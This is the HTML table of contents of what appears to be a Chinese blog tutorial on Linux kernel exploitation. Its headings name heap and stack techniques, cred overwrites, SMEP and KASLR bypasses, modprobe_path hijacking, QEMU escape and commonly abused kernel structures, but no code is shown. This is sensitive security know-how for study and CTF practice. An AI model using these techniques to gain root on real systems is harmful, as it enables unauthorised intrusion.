          Dmesg</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kallsyms"><span class="toc-text">
          kallsyms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#module"><span class="toc-text">
          module</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%B8%8B%E8%BD%BDgeneric%E7%89%88%E6%9C%AC%E5%86%85%E6%A0%B8"><span class="toc-text">
          三、下载generic版本内核</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%89%93%E5%8D%B0%E5%9C%B0%E5%9D%80"><span class="toc-text">
          四、打印地址</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%B8%B8%E8%A7%84%E6%89%93%E5%8D%B0"><span class="toc-text">
          1.常规打印</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-gdb%E5%BC%8F%E6%89%93%E5%8D%B0"><span class="toc-text">
          2.gdb式打印</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E9%A2%9C%E8%89%B2%E6%89%93%E5%8D%B0"><span class="toc-text">
          3.颜色打印</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%90%9C%E7%B4%A2%E5%86%85%E5%AD%98"><span class="toc-text">
          五、搜索内存</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="toc-text">
          六、常见漏洞及利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%A0%86"><span class="toc-text">
          1.堆</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">
          前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E9%85%8D%E6%96%B9%E5%BC%8F"><span class="toc-text">
          分配方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E9%85%8D%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="toc-text">
          分配基地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kmalloc-caches"><span class="toc-text">
          kmalloc_caches</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SLUB%E4%B8%8B"><span class="toc-text">
          SLUB下</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E7%BB%B4kmalloc-caches"><span class="toc-text">
          一维kmalloc_caches</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A4%9A%E7%BB%B4kmalloc-caches"><span class="toc-text">
          多维kmalloc_caches</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%85SLAB%E4%B8%8B"><span class="toc-text">
          仅SLAB下</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%F0%9F%94%BA%E6%B3%A8%EF%BC%9A"><span class="toc-text">
          🔺注：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#SLAB%EF%BC%9A"><span class="toc-text">
          SLAB：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#SLUB%EF%BC%9A"><span class="toc-text">
          SLUB：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9cred%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-text">
          修改cred结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9FD%E7%94%B3%E8%AF%B7"><span class="toc-text">
          修改FD申请</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-HARDENED%E4%BF%9D%E6%8A%A4"><span class="toc-text">
          (1)HARDENED保护</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%F0%9F%94%BA%E6%B3%A8%EF%BC%9A-1"><span class="toc-text">
          🔺注：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9C%AA%E5%BC%80%E5%90%AFKASLR"><span class="toc-text">
          未开启KASLR</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%BC%80%E5%90%AFKASLR"><span class="toc-text">
          开启KASLR</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%91%A00x8%E4%B8%BA%E4%BE%8B"><span class="toc-text">
          ①0x8为例</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%91%A10x10%EF%BC%8C0x20%EF%BC%8C0x30%E7%AD%89%E7%AD%89"><span class="toc-text">
          ②0x10，0x20，0x30等等</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2random"><span class="toc-text">
          泄露random</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E5%A0%86%E5%9C%B0%E5%9D%80%E4%BB%BB%E6%84%8F%E5%86%99"><span class="toc-text">
          获得堆地址任意写</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-HARDENED%E6%96%B0%E7%89%88%E6%94%B9%E5%8A%A8"><span class="toc-text">
          (2)HARDENED新版改动</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#kasan-reset-tag"><span class="toc-text">
          kasan_reset_tag</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#swab"><span class="toc-text">
          swab</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#double-free"><span class="toc-text">
          double_free</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-RANDOM%E4%BF%9D%E6%8A%A4"><span class="toc-text">
          (3)RANDOM保护</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%80%9F%E5%8A%A9prctl%E5%87%BD%E6%95%B0%E5%AF%BB%E6%89%BEcred%E5%9C%B0%E5%9D%80"><span class="toc-text">
          借助prctl函数寻找cred地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%80%9F%E5%8A%A9stat%E8%AE%BE%E5%A4%87%E4%BF%AE%E6%94%B9%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88"><span class="toc-text">
          借助stat设备修改函数指针</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%80%9F%E5%8A%A9ptmx%E8%AE%BE%E5%A4%87-tty-struct"><span class="toc-text">
          借助ptmx设备(tty_struct)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%A0%88"><span class="toc-text">
          2.栈</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-commit-creds-prepare-kernel-cred-0"><span class="toc-text">
          (1)commit_creds(prepare_kernel_cred(0));</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%BC%80%E5%90%AFSMEP%E6%83%85%E5%86%B5"><span class="toc-text">
          ①开启SMEP情况</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ROP%E5%85%B3%E9%97%ADSMEP%E4%BF%9D%E6%8A%A4%EF%BC%8C%E6%89%A7%E8%A1%8C%E7%94%A8%E6%88%B7%E6%80%81%E6%8F%90%E6%9D%83%E4%BB%A3%E7%A0%81"><span class="toc-text">
          ROP关闭SMEP保护，执行用户态提权代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ROP%E5%9C%A8%E5%86%85%E6%A0%B8%E6%80%81%E6%8F%90%E6%9D%83%E5%90%8E%E8%BF%94%E5%9B%9E%E7%94%A8%E6%88%B7%E6%80%81%E8%B5%B7Shell"><span class="toc-text">
          ROP在内核态提权后返回用户态起Shell</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E6%9C%AA%E5%BC%80%E5%90%AFSMEP%E6%83%85%E5%86%B5"><span class="toc-text">
          ②未开启SMEP情况</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-mmap%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84"><span class="toc-text">
          3.mmap内存映射</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%89%8B%E6%AE%B5"><span class="toc-text">
          4.常见提权手段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9modprobe-path"><span class="toc-text">
          修改modprobe_path</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9init-cred"><span class="toc-text">
          修改init_cred</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81prtcl-hook"><span class="toc-text">
          劫持prtcl_hook</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8A%AB%E6%8C%81%E4%B8%BAorderly-poweroff%E5%87%BD%E6%95%B0"><span class="toc-text">
          (1)劫持为orderly_poweroff函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%8A%AB%E6%8C%81%E4%B8%BApoweroff-work-fun%E5%87%BD%E6%95%B0"><span class="toc-text">
          (2)劫持为poweroff_work_fun函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96%E5%9C%B0%E5%9D%80"><span class="toc-text">
          (3)获取地址</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%91%A0prctl-hook"><span class="toc-text">
          ①prctl_hook</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%91%A1poweroff-cmd%E3%80%81orderly-poweroff%E3%80%81poweroff-work-fun"><span class="toc-text">
          ②poweroff_cmd、orderly_poweroff、poweroff_work_fun</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E6%84%8F%E6%83%B3%E4%B8%8D%E5%88%B0%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-text">
          七、意想不到的方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-QEMU%E9%80%83%E9%80%B8"><span class="toc-text">
          1.QEMU逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%9D%83%E9%99%90%E5%8F%8A%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98"><span class="toc-text">
          2.权限及相关配置问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-bin%E7%9B%AE%E5%BD%95%E4%B8%8D%E4%B8%BAROOT"><span class="toc-text">
          (1)bin目录不为ROOT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8D%E4%B8%BAROOT"><span class="toc-text">
          (2)根目录不为ROOT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AF%86%E7%A0%81%E6%9C%AA%E8%AE%BE%E7%BD%AE"><span class="toc-text">
          (3)密码未设置</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E6%A8%A1%E6%9D%BF"><span class="toc-text">
          八、模板</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BF%9D%E5%AD%98%E7%8A%B6%E6%80%81"><span class="toc-text">
          1.保存状态</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%94%A8%E6%88%B7%E6%80%81%E8%B5%B7Shell"><span class="toc-text">
          2.用户态起Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%BF%94%E5%9B%9E%E7%94%A8%E6%88%B7%E6%80%81"><span class="toc-text">
          3.返回用户态</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B2%A1%E6%9C%89KPTI"><span class="toc-text">
          (1)没有KPTI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AD%98%E5%9C%A8KPTI"><span class="toc-text">
          (2)存在KPTI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E7%88%86%E7%A0%B4KASLR"><span class="toc-text">
          4.爆破KASLR</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-POC%E9%87%8C"><span class="toc-text">
          (1)POC里</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%93%E8%BF%9C%E7%A8%8B%E7%9A%84EXP"><span class="toc-text">
          (2)打远程的EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-retUsr%E6%A8%A1%E6%9D%BF"><span class="toc-text">
          5.retUsr模板</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E5%B8%B8%E8%A7%81%E5%8F%AF%E5%88%A9%E7%94%A8%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-text">
          九、常见可利用结构体</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-tty%E7%B3%BB%E5%88%97%E7%BB%93%E6%9E%84%E4%BD%93%E2%80%94kmalloc-1024"><span class="toc-text">
          1.tty系列结构体—kmalloc-1024</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-seq-operations%E7%BB%93%E6%9E%84%E4%BD%93%E2%80%94-kmalloc-32"><span class="toc-text">
          2.seq_operations结构体—-kmalloc-32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-subprocess-info%E7%BB%93%E6%9E%84%E4%BD%93%E2%80%94kmalloc-128"><span class="toc-text">
          3.subprocess_info结构体—kmalloc-128</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-ldt-struct%E7%BB%93%E6%9E%84%E4%BD%93%E2%80%94kmalloc-16"><span class="toc-text">
          4.ldt_struct结构体—kmalloc-16</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">
          (1)前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-text">
          结构体</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-text">
          系统调用函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96"><span class="toc-text">
          (2)实现任意读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-text">
          (3)实现任意地址写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-kern-table%E6%95%B0%E7%BB%84"><span class="toc-text">
          5.kern_table数组</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-1"><span class="toc-text">
          前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96"><span class="toc-text">
          实现任意读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84"><span class="toc-text">
          内存映射</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%A4%8D%E5%88%B6"><span class="toc-text">
          内存复制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#KASLR"><span class="toc-text">
          KASLR</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SVR4"><span class="toc-text">
          SVR4</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ext4"><span class="toc-text">
          ext4</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%8C%9C%E6%83%B3"><span class="toc-text">
          其他猜想</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%9B%B4%E6%94%B9"><span class="toc-text">
          权限更改</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%9C%A8%E9%97%AE%E9%A2%98"><span class="toc-text">
          存在问题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-ksymtab%E6%95%B0%E7%BB%84"><span class="toc-text">
          6.__ksymtab数组</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-2"><span class="toc-text">
          前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87FG-KASLR"><span class="toc-text">
          绕过FG-KASLR</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-pipe%E7%AE%A1%E9%81%93%E2%80%94kmalloc-1024-kmalloc-192"><span class="toc-text">
          7.pipe管道—kmalloc-1024&#x2F;kmalloc-192</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">
          (1)使用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%88%9B%E5%BB%BA"><span class="toc-text">
          ①创建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E9%87%8A%E6%94%BE"><span class="toc-text">
          ②释放</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E4%B8%8E%E9%87%8A%E6%94%BE"><span class="toc-text">
          (2)内存分配与释放</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%88%86%E9%85%8D"><span class="toc-text">
          ①分配</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E9%87%8A%E6%94%BE-1"><span class="toc-text">
          ②释放</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8"><span class="toc-text">
          (3)利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">
          ①信息泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81"><span class="toc-text">
          ②劫持程序流</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-sk-buff%E2%80%94kmalloc-512%E5%8F%8A%E4%BB%A5%E4%B8%8A"><span class="toc-text">
          8.sk_buff—kmalloc-512及以上</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95-1"><span class="toc-text">
          (1)使用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%88%9B%E5%BB%BA-1"><span class="toc-text">
          ①创建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E9%87%8A%E6%94%BE-2"><span class="toc-text">
          ②释放</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E4%B8%8E%E9%87%8A%E6%94%BE-1"><span class="toc-text">
          (2)内存分配与释放</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%88%86%E9%85%8D-1"><span class="toc-text">
          ①分配</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#A-%E5%86%85%E5%AD%98%E7%94%B3%E8%AF%B7"><span class="toc-text">
          A.内存申请</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E7%94%B3%E8%AF%B7%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">
          内存申请总结：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#B-%E6%95%B0%E6%8D%AE%E5%A4%8D%E5%88%B6"><span class="toc-text">
          B.数据复制</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E9%87%8A%E6%94%BE-3"><span class="toc-text">
          ②释放</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#A-%E6%95%B0%E6%8D%AE%E5%A4%8D%E5%88%B6"><span class="toc-text">
          A.数据复制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#B-%E5%86%85%E5%AD%98%E9%87%8A%E6%94%BE"><span class="toc-text">
          B.内存释放</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%87%8A%E6%94%BE%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">
          内存释放总结：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-setxattr%E2%80%94%E8%BF%91%E4%B9%8E%E4%BB%BB%E6%84%8F%E5%A4%A7%E5%B0%8F"><span class="toc-text">
          9.setxattr—近乎任意大小</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%BA%E6%B3%A8%EF%BC%9A-2"><span class="toc-text">
          🔺注：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-msg-msg%E7%BB%93%E6%9E%84%E4%BD%93%E2%80%94kmalloc-16%E8%87%B3kmalloc-1024"><span class="toc-text">
          10.msg_msg结构体—kmalloc-16至kmalloc-1024</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95-2"><span class="toc-text">
          (1)使用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%88%9B%E5%BB%BA-2"><span class="toc-text">
          ①创建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93"><span class="toc-text">
          ②数据传输</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2%E9%87%8A%E6%94%BE"><span class="toc-text">
          ③释放</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">
          总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E4%B8%8E%E9%87%8A%E6%94%BE-2"><span class="toc-text">
          (2)内存分配与释放</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%88%9B%E5%BB%BA-3"><span class="toc-text">
          ①创建</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#A-%E5%86%85%E5%AD%98%E7%94%B3%E8%AF%B7-1"><span class="toc-text">
          A.内存申请</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84%EF%BC%9A"><span class="toc-text">
          相关内存结构：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E7%94%B3%E8%AF%B7%E6%80%BB%E7%BB%93%EF%BC%9A-1"><span class="toc-text">
          内存申请总结：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#B-%E6%95%B0%E6%8D%AE%E5%A4%8D%E5%88%B6-1"><span class="toc-text">
          B.数据复制</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E9%87%8A%E6%94%BE-4"><span class="toc-text">
          ②释放</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#A-%E9%9D%9E%E5%A0%86%E5%9D%97%E9%87%8A%E6%94%BE%E7%9A%84%E6%95%B0%E6%8D%AE%E8%AF%BB%E5%8F%96"><span class="toc-text">
          A.非堆块释放的数据读取</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#B-%E9%87%8A%E6%94%BE%E5%A0%86%E5%9D%97%E7%9A%84%E6%B6%88%E6%81%AF%E8%AF%BB%E5%8F%96"><span class="toc-text">
          B.释放堆块的消息读取</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#C-%E6%95%B0%E6%8D%AE%E5%A4%8D%E5%88%B6"><span class="toc-text">
          C.数据复制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8-1"><span class="toc-text">
          (3)利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96"><span class="toc-text">
          越界读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96"><span class="toc-text">
          任意读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%86%99"><span class="toc-text">
          任意写</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E3%80%81%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93"><span class="toc-text">
          十、常见函数总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#printk"><span class="toc-text">
          printk:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kmalloc"><span class="toc-text">
          kmalloc:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kfree"><span class="toc-text">
          kfree:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#copy-from-user"><span class="toc-text">
          copy_from_user:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#copy-to-user"><span class="toc-text">
          copy_to_user:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E5%85%B6%E4%BB%96%E7%9F%A5%E8%AF%86"><span class="toc-text">
          十一、其他知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E9%9A%90%E8%97%8F"><span class="toc-text">
          1.内核模块隐藏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-text">
          2.文件系统</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SRV4%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-text">
          (1)SRV4文件系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-ext4%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-text">
          (2)ext4文件系统</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%AE%BE%E5%A4%87%E6%93%8D%E4%BD%9C"><span class="toc-text">
          3.设备操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E8%8E%B7%E5%8F%96%E5%86%85%E6%A0%B8%E7%AC%A6%E5%8F%B7"><span class="toc-text">
          4.获取内核符号</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%90%AF%E5%8A%A8%E5%86%85%E6%A0%B8"><span class="toc-text">
          (1)启动内核</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-text">
          (2)使用工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E4%BA%92%E6%96%A5%E9%94%81%E5%92%8C%E4%BF%A1%E5%8F%B7%E9%87%8F"><span class="toc-text">
          5.互斥锁和信号量</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BA%92%E6%96%A5%E9%94%81"><span class="toc-text">
          (1)互斥锁</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BF%A1%E5%8F%B7%E9%87%8F"><span class="toc-text">
          (2)信号量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%BD%BF%E7%94%A8"><span class="toc-text">
